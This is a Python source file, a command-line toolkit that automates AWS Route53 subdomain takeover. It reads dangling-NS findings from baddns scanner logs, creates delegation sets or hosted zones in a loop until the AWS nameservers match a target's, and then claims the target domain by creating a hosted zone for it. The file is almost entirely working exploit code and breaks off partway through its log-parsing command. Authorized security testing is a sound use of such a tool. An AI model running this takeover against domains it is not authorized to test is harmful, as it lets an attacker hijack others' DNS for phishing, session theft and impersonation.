#!/usr/bin/env python3
"""
AWS Route53 Domain Takeover Toolkit

A unified tool for identifying and exploiting dangling DNS delegation
vulnerabilities in AWS Route53.  Designed for authorized security testing.

High-level workflow (automated with the 'takeover' subcommand):
    1. Define AWS nameservers  - extracted from a baddns log or manually
    2. Validate                - confirm NS match ns-XXXX.awsdns-XX.{com,net,org,co.uk}
    3. Hunt delegation set     - create delegation sets until an exact NS set match
    4. Auto-takeover           - create hosted zone for the matched domain(s)
    5. Conditional cleanup     - keep delegation set on success, delete on failure
    6. Statistics              - print discovery stats and save to JSON

Subcommands:
    hunt-delegation-set  Find the first reusable delegation set matching target NS
                                             (no zone creation — use 'takeover' for that).
    takeover             Full 6-step workflow: hunt delegation set, create hosted
                                             zone on match, conditional cleanup.
    hunt-zone            Hunt target NS by creating hosted zones ($0.50 each).
    delete-sets          List / delete all reusable delegation sets in the account.
    parse-baddns         Parse baddns scanner output and extract vulnerable targets.

Usage:
        python aws-domain-takeover.py --sub-command hunt-delegation-set --target-ns "ns-123.awsdns-01.com. ns-456.awsdns-02.net."
        python aws-domain-takeover.py --sub-command takeover --parse-ns-from scan.baddns.log --zone-name example.com
        python aws-domain-takeover.py --sub-command hunt-zone --zone-name example.com --parse-ns-from scan.baddns.log
        python aws-domain-takeover.py --sub-command delete-sets [--force]
        python aws-domain-takeover.py --sub-command parse-baddns --file baddns.log

        # Positional subcommand syntax is also supported:
        python aws-domain-takeover.py takeover --parse-ns-from scan.baddns.log --zone-name example.com

Author: Oleksandr Kazymyrov
"""

import argparse
import json
import logging
import re
import signal
import sys
import time
from pathlib import Path
from typing import Optional

try:
    import boto3
    from botocore.exceptions import ClientError, BotoCoreError
except ImportError:
    boto3 = None  # type: ignore[assignment]
    ClientError = Exception  # type: ignore[misc,assignment]
    BotoCoreError = Exception  # type: ignore[misc,assignment]

# ─────────────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────────────

DEFAULT_MAX_ATTEMPTS = 10000
DEFAULT_SLEEP = 0.5  # seconds
STATS_INTERVAL = 10  # print stats every N attempts

COLORS = {
    "green": "\033[92m",
    "red": "\033[91m",
    "yellow": "\033[93m",
    "blue": "\033[94m",
    "reset": "\033[0m",
}

# ─────────────────────────────────────────────────────────────────────
# Logging Setup
# ─────────────────────────────────────────────────────────────────────

logger = logging.getLogger("aws-domain-takeover")


def setup_logging(verbose: bool = False, log_file: Optional[str] = None):
    """Configure structured logging with console and optional file output."""
    level = logging.DEBUG if verbose else logging.INFO
    fmt = "%(asctime)s [%(levelname)s] %(message)s"
    datefmt = "%Y-%m-%d %H:%M:%S"

    handlers: list[logging.Handler] = [logging.StreamHandler(sys.stdout)]
    if log_file:
        handlers.append(logging.FileHandler(log_file, encoding="utf-8"))

    logging.basicConfig(level=level, format=fmt, datefmt=datefmt, handlers=handlers)


# ─────────────────────────────────────────────────────────────────────
# Color Helpers
# ─────────────────────────────────────────────────────────────────────

def _supports_color() -> bool:
    """Check if the terminal supports ANSI color codes."""
    if sys.platform == "win32":
        try:
            import os
            return os.environ.get("TERM") or os.environ.get("WT_SESSION") or "ANSICON" in os.environ
        except Exception:
            return False
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()


def colored(text: str, color: str) -> str:
    """Wrap text in ANSI color codes if terminal supports it."""
    if _supports_color() and color in COLORS:
        return f"{COLORS[color]}{text}{COLORS['reset']}"
    return text


# ─────────────────────────────────────────────────────────────────────
# AWS Client
# ─────────────────────────────────────────────────────────────────────

def get_route53_client(profile: Optional[str] = None):
    """Initialize and validate Route53 client with credential check."""
    if boto3 is None:
        logger.error("boto3 is not installed. Run: pip install boto3")
        sys.exit(1)
    try:
        session = boto3.Session(profile_name=profile) if profile else boto3.Session()
        sts = session.client("sts")
        identity = sts.get_caller_identity()
        logger.info(
            "Authenticated as %s (Account: %s)",
            identity.get("Arn", "unknown"),
            identity.get("Account", "unknown"),
        )
        return session.client("route53")
    except ClientError as e:
        logger.error("AWS authentication failed: %s", e.response["Error"]["Message"])
        sys.exit(1)
    except BotoCoreError as e:
        logger.error("AWS client error: %s", e)
        sys.exit(1)
    except Exception as e:
        logger.error("Failed to initialize AWS client: %s", e)
        sys.exit(1)


# ─────────────────────────────────────────────────────────────────────
# Statistics Tracker
# ─────────────────────────────────────────────────────────────────────

class StatisticsTracker:
    """Track and persist discovered nameserver statistics across runs."""

    def __init__(self, stats_file: Path):
        self.stats_file = stats_file
        self.all_seen_ns: set[str] = set()
        self.new_this_run: set[str] = set()
        self.run_start_count = 0
        self._load()

    def _load(self):
        """Load previously seen nameservers from file."""
        if self.stats_file.exists():
            try:
                with open(self.stats_file, "r") as f:
                    data = json.load(f)
                    self.all_seen_ns = set(data.get("seen_nameservers", []))
            except Exception as e:
                logger.warning("Could not load statistics file: %s", e)
        self.run_start_count = len(self.all_seen_ns)
        logger.info("Loaded %d previously seen nameservers", self.run_start_count)

    def save(self):
        """Save seen nameservers to file."""
        try:
            with open(self.stats_file, "w") as f:
                json.dump(
                    {
                        "seen_nameservers": sorted(self.all_seen_ns),
                        "total_count": len(self.all_seen_ns),
                        "last_updated": time.strftime("%Y-%m-%d %H:%M:%S"),
                    },
                    f,
                    indent=2,
                )
        except Exception as e:
            logger.warning("Could not save statistics: %s", e)

    def track(self, ns_records: list[str]) -> set[str]:
        """Track new nameservers. Returns set of newly discovered ones."""
        ns_set = set(ns_records)
        newly_discovered = ns_set - self.all_seen_ns
        if newly_discovered:
            self.new_this_run.update(newly_discovered)
            self.all_seen_ns.update(newly_discovered)
            self.save()
        return newly_discovered

    def print_summary(self, attempt: Optional[int] = None):
        """Print statistics summary."""
        header = f"STATISTICS (Attempt {attempt})" if attempt else "FINAL STATISTICS"
        print(f"\n{'=' * 60}")
        print(f"  {header}")
        print(f"{'=' * 60}")
        print(f"  Total unique NS servers seen (all time): {len(self.all_seen_ns)}")
        print(f"  New NS servers discovered this run:      {len(self.new_this_run)}")
        print(f"  Previously known NS servers:             {self.run_start_count}")
        print(f"{'=' * 60}\n")


# ─────────────────────────────────────────────────────────────────────
# Nameserver Helpers
# ─────────────────────────────────────────────────────────────────────

def normalize_ns(ns: str) -> str:
    """Ensure nameserver has trailing dot."""
    return ns if ns.endswith(".") else ns + "."


def validate_ns(ns: str) -> bool:
    """Check if a nameserver matches the AWS Route53 naming pattern."""
    return bool(_AWS_NS_PATTERN.search(ns.rstrip(".")))


# Regex to match AWS Route53 nameservers (e.g. ns-1704.awsdns-21.co.uk)
_AWS_NS_PATTERN = re.compile(r"\bns-\d+\.awsdns-\d+\.(?:com|net|org|co\.uk)\b", re.IGNORECASE)


def extract_aws_ns_from_file(filepath: str) -> set[str]:
    """Extract all AWS Route53 nameservers from any file using regex."""
    path = Path(filepath)
    if not path.exists():
        logger.error("File not found: %s", filepath)
        sys.exit(1)

    found = set()
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            matches = _AWS_NS_PATTERN.findall(line)
            found.update(normalize_ns(m) for m in matches)

    if not found:
        logger.warning("No AWS nameservers found in %s", filepath)
    else:
        logger.info("Extracted %d unique AWS nameservers from %s", len(found), filepath)
    return found


def parse_baddns_targets(filepath: str) -> list[tuple[str, set[str]]]:
    """Parse a baddns log and extract ``(target_domain, ns_set)`` pairs.

    Each pair maps a vulnerable domain to the set of AWS nameservers
    detected as dangling.  Used by ``cmd_takeover`` to resolve the
    correct zone name when a delegation set's NS overlaps with an entry.

    Example baddns JSON line::

        {"target": "staging.example.com",
         "signature": "AWS Route53",
         "trigger": "ns-1215.awsdns-23.org, ns-8.awsdns-01.com, ..."}

    Returns a list so ordering is preserved (first match wins).
    """
    path = Path(filepath)
    if not path.exists():
        logger.error("File not found: %s", filepath)
        return []

    targets: list[tuple[str, set[str]]] = []
    seen: set[str] = set()  # deduplicate by target

    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                entry = json.loads(line)
            except json.JSONDecodeError:
                continue

            if entry.get("signature") != "AWS Route53":
                continue

            target = entry.get("target", "")
            trigger = entry.get("trigger", "")
            if not target or not trigger:
                continue
            if target in seen:
                continue
            seen.add(target)

            ns_set = {
                normalize_ns(ns.strip())
                for ns in trigger.split(",")
                if _AWS_NS_PATTERN.search(ns.strip())
            }
            if len(ns_set) >= 2:
                targets.append((target, ns_set))

    if targets:
        logger.info(
            "Parsed %d target(s) from baddns log: %s",
            len(targets),
            ", ".join(t for t, _ in targets),
        )
    else:
        logger.warning("No AWS Route53 targets found in %s", filepath)

    return targets


def load_target_ns(
    ns_list: Optional[str] = None,
    ns_file: Optional[str] = None,
    parse_ns_from: Optional[str] = None,
) -> set[str]:
    """Load target nameservers from CLI args, file, or by parsing a log file.

    If --parse-ns-from is provided it takes precedence and overwrites any
    other source.  The *ns_list* argument is a single quoted string that is
    split on whitespace and/or commas.
    """
    # --parse-ns-from overwrites everything else
    if parse_ns_from:
        targets = extract_aws_ns_from_file(parse_ns_from)
        if not targets:
            logger.error("No AWS nameservers extracted from %s", parse_ns_from)
            sys.exit(1)
        logger.info("Loaded %d target nameservers (from --parse-ns-from)", len(targets))
        return targets

    targets = set()

    if ns_list:
        parts = re.split(r"[,\s]+", ns_list.strip())
        targets.update(normalize_ns(ns) for ns in parts if ns)

    if ns_file:
        path = Path(ns_file)
        if not path.exists():
            logger.error("Target NS file not found: %s", ns_file)
            sys.exit(1)
        with open(path, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.add(normalize_ns(line))

    if not targets:
        logger.error("No target nameservers specified. Use --target-ns, --target-ns-file, or --parse-ns-from")
        sys.exit(1)

    # Validate NS format (only for manually specified NS)
    invalid = {ns for ns in targets if not validate_ns(ns)}
    if invalid:
        logger.warning(
            "Removing %d non-AWS nameserver(s): %s",
            len(invalid),
            ", ".join(sorted(invalid)),
        )
        targets -= invalid
        if not targets:
            logger.error("No valid AWS nameservers remaining after validation")
            sys.exit(1)

    logger.info("Loaded %d target nameservers", len(targets))
    return targets


# ─────────────────────────────────────────────────────────────────────
# Graceful Shutdown
# ─────────────────────────────────────────────────────────────────────

_shutdown_requested = False


def _signal_handler(signum, frame):
    global _shutdown_requested
    if _shutdown_requested:
        logger.warning("Force quit requested")
        sys.exit(1)
    _shutdown_requested = True
    logger.warning("Shutdown requested - finishing current attempt, then stopping...")


signal.signal(signal.SIGINT, _signal_handler)


# ─────────────────────────────────────────────────────────────────────
# Command: hunt-delegation-set
# ─────────────────────────────────────────────────────────────────────

def cmd_hunt_delegation_set(args):
    """Find the first reusable delegation set matching target nameservers.

    Creates delegation sets until one contains a nameserver that overlaps
    with the target NS list, then keeps it and stops.  No hosted zones are
    created — use the 'takeover' subcommand for that.
    """
    client = get_route53_client(args.profile)
    target_ns = load_target_ns(args.target_ns, args.target_ns_file, args.parse_ns_from)
    stats_file = Path(args.stats_file) if args.stats_file else Path(__file__).parent / "delegation_set_statistics.json"
    stats = StatisticsTracker(stats_file)

    max_attempts = args.max_attempts
    sleep_between = args.sleep

    print(colored("=" * 60, "blue"))
    print(colored("  AWS Route53 Reusable Delegation Set Hunter", "blue"))
    print(colored("=" * 60, "blue"))
    print(f"  Target NS:     {len(target_ns)} nameservers")
    print(f"  Max attempts:  {max_attempts}")
    print(f"  Dry run:       {args.dry_run}")
    print()

    if args.dry_run:
        logger.info("[DRY RUN] Would create up to %d delegation sets looking for:", max_attempts)
        for ns in sorted(target_ns):
            logger.info("  - %s", ns)
        return

    for attempt in range(1, max_attempts + 1):
        if _shutdown_requested:
            logger.info("Stopping after %d attempts (user interrupt)", attempt - 1)
            break

        logger.info("Attempt %d/%d...", attempt, max_attempts)
        delegation_set_id = None

        try:
            response = client.create_reusable_delegation_set(
                CallerReference=f"hunt-{int(time.time() * 1000)}"
            )

            delegation_set = response["DelegationSet"]
            delegation_set_id = delegation_set["Id"]
            ns_records = [normalize_ns(ns) for ns in delegation_set["NameServers"]]

            logger.info("Created delegation set: %s", delegation_set_id)
            logger.info("NS records: %s", ", ".join(ns_records))

            # Track statistics
            newly_discovered = stats.track(ns_records)
            if newly_discovered:
                logger.info(colored("NEW nameservers: %s", "yellow"), ", ".join(newly_discovered))

            if attempt % STATS_INTERVAL == 0 or newly_discovered:
                stats.print_summary(attempt)

            # Check for any NS overlap
            matching_ns = [ns for ns in ns_records if ns in target_ns]

            if matching_ns:
                print(colored(f"\n{'=' * 60}", "green"))
                print(colored("  MATCH - Found target nameservers!", "green"))
                print(colored(f"{'=' * 60}", "green"))
                print(f"  Matching NS:       {', '.join(matching_ns)}")
                print(f"  Delegation Set ID: {delegation_set_id}")
                print(f"  All NS records:    {', '.join(ns_records)}")
                print(colored(f"{'=' * 60}", "green"))
                logger.info("Keeping delegation set %s", delegation_set_id)
                stats.save()
                stats.print_summary()
                return

            # No match — clean up and continue
            logger.info("No match - deleting delegation set")
            client.delete_reusable_delegation_set(Id=delegation_set_id)
            logger.debug("Deleted delegation set %s", delegation_set_id)
            time.sleep(sleep_between)

        except ClientError as e:
            error_code = e.response["Error"]["Code"]
            if error_code == "Throttling":
                logger.warning("Rate limited - backing off for 5 seconds")
                time.sleep(5)
            else:
                logger.error("AWS API error: %s - %s", error_code, e.response["Error"]["Message"])
                _cleanup_delegation_set(client, delegation_set_id)
                time.sleep(sleep_between)

        except Exception as e:
            logger.error("Unexpected error: %s", e)
            _cleanup_delegation_set(client, delegation_set_id)
            time.sleep(sleep_between)
    else:
        logger.warning("Maximum attempts (%d) reached without finding target NS", max_attempts)

    stats.save()
    stats.print_summary()


def _cleanup_delegation_set(client, delegation_set_id: Optional[str]):
    """Safe cleanup of a delegation set."""
    if not delegation_set_id:
        return
    try:
        client.delete_reusable_delegation_set(Id=delegation_set_id)
        logger.info("Cleaned up delegation set %s", delegation_set_id)
    except Exception as e:
        logger.error("Cleanup failed for %s: %s", delegation_set_id, e)


# ─────────────────────────────────────────────────────────────────────
# Command: takeover
# ─────────────────────────────────────────────────────────────────────

def _resolve_zone_for_match(
    matching_ns: list[str],
    baddns_targets: list[tuple[str, set[str]]],
    zone_name_override: Optional[str],
) -> Optional[str]:
    """Return the zone/domain to create for a set of matching nameservers.

    * If *zone_name_override* is set (``--zone-name``), always use it.
    * Otherwise walk *baddns_targets* and return the ``target`` of the
      first entry whose NS set overlaps with *matching_ns*.
    """
    if zone_name_override:
        return zone_name_override
    matching_set = set(matching_ns)
    for target, entry_ns in baddns_targets:
        if matching_set & entry_ns:
            return target
    return None


def _resolve_all_zones_for_match(
    ns_records: list[str],
    baddns_targets: list[tuple[str, set[str]]],
    zone_name_override: Optional[str],
) -> list[str]:
    """Return *all* zone/domain names whose NS overlap with the delegation set.

    * If *zone_name_override* is set (``--zone-name``), return ``[zone_name_override]``.
    * Otherwise walk *baddns_targets* and collect every ``target`` whose NS
      set overlaps with *ns_records*.
    """
    if zone_name_override:
        return [zone_name_override]
    ns_set = set(ns_records)
    return [target for target, entry_ns in baddns_targets if ns_set & entry_ns]


def cmd_takeover(args):
    """Full domain takeover workflow.

    1. Define NS    — from --parse-ns-from (baddns log) or --target-ns
    2. Validate     — confirm NS match AWS Route53 pattern
    3. Hunt         — create delegation sets until any NS overlap
    4. Resolve zone — look up the target domain from the baddns entry
    5. Takeover     — create hosted zone with DelegationSetId
    6. Cleanup      — keep delegation set on success, delete on failure
    7. Statistics   — print and save discovery stats
    """
    client = get_route53_client(args.profile)
    target_ns = load_target_ns(args.target_ns, args.target_ns_file, args.parse_ns_from)
    stats_file = Path(args.stats_file) if args.stats_file else Path(__file__).parent / "delegation_set_statistics.json"
    stats = StatisticsTracker(stats_file)

    zone_name_override = getattr(args, "zone_name", None)  # manual --zone-name

    # Build baddns target list so we can resolve zone names dynamically
    baddns_targets: list[tuple[str, set[str]]] = []
    if args.parse_ns_from:
        baddns_targets = parse_baddns_targets(args.parse_ns_from)
        if not baddns_targets:
            logger.error("No valid AWS Route53 targets found in %s", args.parse_ns_from)
            sys.exit(1)

    if not zone_name_override and not baddns_targets:
        logger.error(
            "Takeover requires --parse-ns-from <baddns.log> (zone names are resolved "
            "automatically) or explicit --zone-name <domain> with --target-ns."
        )
        sys.exit(1)

    max_attempts = args.max_attempts
    sleep_between = args.sleep

    print(colored("=" * 60, "blue"))
    print(colored("  AWS Route53 Domain Takeover", "blue"))
    print(colored("=" * 60, "blue"))
    print(f"  Target NS:     {len(target_ns)} nameservers")
    if zone_name_override:
        print(f"  Zone name:     {zone_name_override} (manual override)")
    else:
        print(f"  Targets:       {len(baddns_targets)} domain(s) from baddns log")
        for t, ns in baddns_targets:
            print(f"                 {t}  ({len(ns)} NS)")
    print(f"  Max attempts:  {max_attempts}")
    print(f"  Dry run:       {args.dry_run}")
    print()

    if args.dry_run:
        logger.info("[DRY RUN] Would create up to %d delegation sets looking for:", max_attempts)
        logger.info("  Target NS: %s", ", ".join(sorted(target_ns)))
        if zone_name_override:
            logger.info("  Zone name: %s (manual override)", zone_name_override)
        else:
            for t, _ in baddns_targets:
                logger.info("  Target domain: %s", t)
        return

    for attempt in range(1, max_attempts + 1):
        if _shutdown_requested:
            logger.info("Stopping after %d attempts (user interrupt)", attempt - 1)
            break

        logger.info("Attempt %d/%d...", attempt, max_attempts)
        delegation_set_id = None

        try:
            response = client.create_reusable_delegation_set(
                CallerReference=f"takeover-{int(time.time() * 1000)}"
            )

            delegation_set = response["DelegationSet"]
            delegation_set_id = delegation_set["Id"]
            ns_records = [normalize_ns(ns) for ns in delegation_set["NameServers"]]

            logger.info("Created delegation set: %s", delegation_set_id)
            logger.info("NS records: %s", ", ".join(ns_records))

            # Track statistics
            newly_discovered = stats.track(ns_records)
            if newly_discovered:
                logger.info(colored("NEW nameservers: %s", "yellow"), ", ".join(newly_discovered))

            if attempt % STATS_INTERVAL == 0 or newly_discovered:
                stats.print_summary(attempt)

            # Check for any NS overlap with target
            matching_ns = [ns for ns in ns_records if ns in target_ns]

            if matching_ns:
                # Resolve ALL target zones whose NS overlap with this
                # delegation set — not just the first one.
                matching_zones = _resolve_all_zones_for_match(
                    ns_records, baddns_targets, zone_name_override
                )
                if not matching_zones:
                    logger.warning(
                        "NS matched (%s) but could not resolve any zone name — skipping",
                        ", ".join(matching_ns),
                    )
                    _cleanup_delegation_set(client, delegation_set_id)
                    time.sleep(sleep_between)
                    continue

                ns_records_set = set(ns_records)

                print(colored(f"\n{'=' * 60}", "green"))
                print(colored("  MATCH - Found target nameservers!", "green"))
                print(colored(f"{'=' * 60}", "green"))
                print(f"  Matching NS:       {', '.join(matching_ns)}")
                print(f"  Matching targets:  {', '.join(matching_zones)}")
                print(f"  Delegation Set ID: {delegation_set_id}")
                print(f"  All NS records:    {', '.join(ns_records)}")
                print()

                # ── Try zone creation for EVERY matching target ───────
                any_zone_created = False
                targets_to_remove: list[str] = []

                for zone_name in matching_zones:
                    logger.info(
                        "Creating hosted zone for '%s' with delegation set %s",
                        zone_name, delegation_set_id,
                    )
                    try:
                        zone_resp = client.create_hosted_zone(
                            Name=zone_name,
                            CallerReference=f"takeover-{zone_name}-{int(time.time())}",
                            DelegationSetId=delegation_set_id,
                        )
                        zone_id = zone_resp["HostedZone"]["Id"]
                        print(colored(
                            f"  + Zone created: {zone_name} (ID: {zone_id})", "green"
                        ))
                        any_zone_created = True
                        targets_to_remove.append(zone_name)

                    except ClientError as e:
                        print(colored(
                            f"  x Zone failed: {zone_name}: "
                            f"{e.response['Error']['Message']}",
                            "red",
                        ))
                        logger.info(
                            "Zone creation failed for '%s' — removing target",
                            zone_name,
                        )
                        targets_to_remove.append(zone_name)

                # ── Remove completed / fully-tested targets ───────────
                for zn in targets_to_remove:
                    entry = next(
                        ((t, ns) for t, ns in baddns_targets if t == zn), None
                    )
                    if entry:
                        baddns_targets.remove(entry)
                        logger.info("Removed target '%s' from queue", zn)

                # ── Prune NS no longer needed by remaining targets ────
                still_needed: set[str] = set()
                for _, ns in baddns_targets:
                    still_needed |= ns
                removed_ns = target_ns - still_needed
                if removed_ns:
                    target_ns -= removed_ns
                    logger.info(
                        "Pruned %d NS no longer needed "
                        "(%d target(s) remaining, %d NS in pool)",
                        len(removed_ns), len(baddns_targets), len(target_ns),
                    )

                # ── Delegation-set disposition ────────────────────────
                if any_zone_created:
                    print(colored(f"{'=' * 60}", "green"))
                    logger.info("Keeping delegation set %s", delegation_set_id)
                else:
                    print(colored(f"{'=' * 60}", "yellow"))
                    logger.warning(
                        "All zone creations failed for this delegation set "
                        "— deleting %s and continuing",
                        delegation_set_id,
                    )
                    _cleanup_delegation_set(client, delegation_set_id)

                # ── Check if we are done ──────────────────────────────
                if zone_name_override and any_zone_created:
                    # Single-target (manual) mode — done
                    stats.save()
                    stats.print_summary()
                    return

                if not baddns_targets and not zone_name_override:
                    logger.info("All targets processed — stopping")
                    stats.save()
                    stats.print_summary()
                    return

                if not target_ns:
                    logger.warning("No target NS remaining — stopping")
                    break

                time.sleep(sleep_between)
                continue

            # ── No match — clean up and continue ──────────────────────
            logger.info("No match - deleting delegation set")
            client.delete_reusable_delegation_set(Id=delegation_set_id)
            logger.debug("Deleted delegation set %s", delegation_set_id)
            time.sleep(sleep_between)

        except ClientError as e:
            error_code = e.response["Error"]["Code"]
            if error_code == "Throttling":
                logger.warning("Rate limited - backing off for 5 seconds")
                time.sleep(5)
            else:
                logger.error("AWS API error: %s - %s", error_code, e.response["Error"]["Message"])
                _cleanup_delegation_set(client, delegation_set_id)
                time.sleep(sleep_between)

        except Exception as e:
            logger.error("Unexpected error: %s", e)
            _cleanup_delegation_set(client, delegation_set_id)
            time.sleep(sleep_between)
    else:
        logger.warning("Maximum attempts (%d) reached without finding target NS", max_attempts)

    stats.save()
    stats.print_summary()


# ─────────────────────────────────────────────────────────────────────
# Command: hunt-zone
# ─────────────────────────────────────────────────────────────────────

def cmd_hunt_zone(args):
    """Hunt for target NS by creating hosted zones."""
    client = get_route53_client(args.profile)
    target_ns = load_target_ns(args.target_ns, args.target_ns_file, args.parse_ns_from)
    stats_file = Path(args.stats_file) if args.stats_file else Path(__file__).parent / "ns_statistics.json"
    stats = StatisticsTracker(stats_file)

    zone_name = args.zone_name
    max_attempts = args.max_attempts
    sleep_between = args.sleep

    if not zone_name:
        logger.error("--zone-name is required for hunt-zone command")
        sys.exit(1)

    print(colored("=" * 60, "blue"))
    print(colored("  AWS Route53 Hosted Zone NS Hunter", "blue"))
    print(colored("=" * 60, "blue"))
    print(f"  Zone name:     {zone_name}")
    print(f"  Target NS:     {len(target_ns)} nameservers")
    print(f"  Max attempts:  {max_attempts}")
    print(f"  Dry run:       {args.dry_run}")
    print(f"  Cost estimate: ~${max_attempts * 0.50:.2f} (worst case)")
    print()

    if args.dry_run:
        logger.info("[DRY RUN] Would create up to %d hosted zones for '%s' looking for:", max_attempts, zone_name)
        for ns in sorted(target_ns):
            logger.info("  - %s", ns)
        return

    for attempt in range(1, max_attempts + 1):
        if _shutdown_requested:
            logger.info("Stopping after %d attempts (user interrupt)", attempt - 1)
            break

        logger.info("Attempt %d/%d...", attempt, max_attempts)
        zone_id = None

        try:
            response = client.create_hosted_zone(
                Name=zone_name,
                CallerReference=str(time.time()),
            )
            zone_id = response["HostedZone"]["Id"]

            # Get NS from the DelegationSet in the creation response (avoids extra API call)
            ns_records = [
                normalize_ns(ns)
                for ns in response.get("DelegationSet", {}).get("NameServers", [])
            ]

            # Fallback: query records if NS not in creation response
            if not ns_records:
                records = client.list_resource_record_sets(HostedZoneId=zone_id)
                for r in records["ResourceRecordSets"]:
                    if r["Type"] == "NS":
                        ns_records = [normalize_ns(rr["Value"]) for rr in r["ResourceRecords"]]
                        break

            logger.info("NS records: %s", ", ".join(ns_records))

            # Track statistics
            newly_discovered = stats.track(ns_records)
            if newly_discovered:
                logger.info(colored("NEW nameservers: %s", "yellow"), ", ".join(newly_discovered))

            if attempt % STATS_INTERVAL == 0 or newly_discovered:
                stats.print_summary(attempt)

            # Check for match
            matching_ns = [ns for ns in ns_records if ns in target_ns]

            if matching_ns:
                print(colored(f"\n{'=' * 60}", "green"))
                print(colored("  SUCCESS! Found target nameservers!", "green"))
                print(colored(f"{'=' * 60}", "green"))
                print(f"  Matching NS:  {', '.join(matching_ns)}")
                print(f"  Zone Name:    {zone_name}")
                print(f"  Zone ID:      {zone_id}")
                print(f"  All NS:       {', '.join(ns_records)}")
                print(colored(f"{'=' * 60}", "green"))
                logger.info("Keeping zone %s (not deleting)", zone_id)
                stats.save()
                return
            else:
                logger.info("No match - deleting hosted zone")
                client.delete_hosted_zone(Id=zone_id)
                logger.debug("Deleted hosted zone %s", zone_id)
                time.sleep(sleep_between)

        except ClientError as e:
            error_code = e.response["Error"]["Code"]
            if error_code == "Throttling":
                logger.warning("Rate limited - backing off for 5 seconds")
                time.sleep(5)
            else:
                logger.error("AWS API error: %s - %s", error_code, e.response["Error"]["Message"])
                _cleanup_zone(client, zone_id)
                time.sleep(sleep_between)

        except Exception as e:
            logger.error("Unexpected error: %s", e)
            _cleanup_zone(client, zone_id)
            time.sleep(sleep_between)
    else:
        logger.warning("Maximum attempts (%d) reached without finding target NS", max_attempts)

    stats.save()
    stats.print_summary()


def _cleanup_zone(client, zone_id: Optional[str]):
    """Safe cleanup of a hosted zone."""
    if not zone_id:
        return
    try:
        client.delete_hosted_zone(Id=zone_id)
        logger.info("Cleaned up hosted zone %s", zone_id)
    except Exception as e:
        logger.error("Cleanup failed for zone %s: %s", zone_id, e)


# ─────────────────────────────────────────────────────────────────────
# Command: delete-sets
# ─────────────────────────────────────────────────────────────────────

def cmd_delete_sets(args):
    """Delete all reusable delegation sets in the account."""
    client = get_route53_client(args.profile)

    print(colored("=" * 60, "blue"))
    print(colored("  AWS Route53 Delegation Set Deletion", "blue"))
    print(colored("=" * 60, "blue"))
    print()

    # Fetch all delegation sets with pagination
    delegation_sets = []
    marker = None

    logger.info("Fetching delegation sets...")
    while True:
        kwargs = {"Marker": marker} if marker else {}
        try:
            response = client.list_reusable_delegation_sets(**kwargs)
        except ClientError as e:
            logger.error("Failed to list delegation sets: %s", e.response["Error"]["Message"])
            sys.exit(1)

        delegation_sets.extend(response.get("DelegationSets", []))
        if response.get("IsTruncated", False):
            marker = response.get("NextMarker")
        else:
            break

    if not delegation_sets:
        print(colored("  No delegation sets found. Nothing to delete.", "green"))
        return

    print(colored(f"  Found {len(delegation_sets)} delegation set(s)\n", "yellow"))

    # Display delegation sets
    for idx, ds in enumerate(delegation_sets, 1):
        ds_id = ds["Id"].split("/")[-1]
        print(colored(f"  {idx}. ID: {ds_id}", "yellow"))
        print(f"     CallerReference: {ds.get('CallerReference', 'N/A')}")
        print(f"     NameServers:     {', '.join(ds.get('NameServers', []))}")
        print()

    if args.dry_run:
        logger.info("[DRY RUN] Would delete %d delegation set(s)", len(delegation_sets))
        return

    # Confirm deletion unless --force
    if not args.force:
        print(colored("  WARNING: This will delete ALL delegation sets listed above!", "red"))
        confirmation = input("  Type 'DELETE' to confirm: ")
        if confirmation != "DELETE":
            print(colored("  Deletion cancelled.", "yellow"))
            return
        print()

    # Delete
    success_count = 0
    failed_count = 0

    for idx, ds in enumerate(delegation_sets, 1):
        ds_id = ds["Id"].split("/")[-1]
        print(f"  [{idx}/{len(delegation_sets)}] Deleting {ds_id}...", end=" ")

        try:
            client.delete_reusable_delegation_set(Id=ds["Id"])
            print(colored("Deleted", "green"))
            success_count += 1
        except ClientError as e:
            error_code = e.response["Error"]["Code"]
            if error_code == "DelegationSetInUse":
                print(colored("Failed: in use by hosted zones", "red"))
            elif error_code == "NoSuchDelegationSet":
                print(colored("Failed: not found", "red"))
            else:
                print(colored(f"Failed: {error_code}", "red"))
            failed_count += 1
        except Exception as e:
            print(colored(f"Failed: {e}", "red"))
            failed_count += 1

    # Summary
    print(f"\n{'=' * 60}")
    print(colored(f"  Successfully deleted: {success_count}", "green"))
    if failed_count > 0:
        print(colored(f"  Failed to delete:    {failed_count}", "red"))
        print(colored("  Note: Delegation sets in use by hosted zones cannot be deleted.", "yellow"))
        print(colored("  Delete the associated hosted zones first, then retry.", "yellow"))
    print()


# ─────────────────────────────────────────────────────────────────────
# Command: parse-baddns
# ─────────────────────────────────────────────────────────────────────

def cmd_parse_baddns(args):
    """Parse baddns log and extract AWS Route53 dangling NS targets."""
    log_file = Path(args.file)
    if not log_file.exists():
        logger.error("File not found: %s", args.file)
        sys.exit(1)

    entries = []
    with open(log_file, "r") as f:
        for line in f:
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                entry = json.loads(line)
            except json.JSONDecodeError:
                continue

            # Filter for AWS Route53 only (unless --all)
            if not args.all and entry.get("signature") != "AWS Route53":
                continue

            target = entry.get("target", "")
            trigger = entry.get("trigger", "")
            ns_list = [normalize_ns(ns.strip()) for ns in trigger.split(",")]

            entries.append({
                "target": target,
                "nameservers": ns_list,
                "confidence": entry.get("confidence", ""),
                "signature": entry.get("signature", ""),
            })

    if not entries:
        print("No matching entries found.")
        return

    # Group by unique NS set
    ns_groups: dict[str, list[str]] = {}
    for entry in entries:
        key = ",".join(sorted(entry["nameservers"]))
        ns_groups.setdefault(key, []).append(entry["target"])

    print(colored("=" * 60, "blue"))
    print(colored("  BadDNS Log Analysis - Dangling NS Records", "blue"))
    print(colored("=" * 60, "blue"))
    print(f"  Total vulnerable targets: {len(entries)}")
    print(f"  Unique NS sets:           {len(ns_groups)}")
    print()

    for idx, (ns_key, targets) in enumerate(sorted(ns_groups.items(), key=lambda x: -len(x[1])), 1):
        ns_list = ns_key.split(",")
        print(colored(f"  NS Set #{idx} ({len(targets)} target(s)):", "yellow"))
        for ns in sorted(ns_list):
            print(f"    {ns}")
        print(f"  Affected domains:")
        for t in sorted(targets):
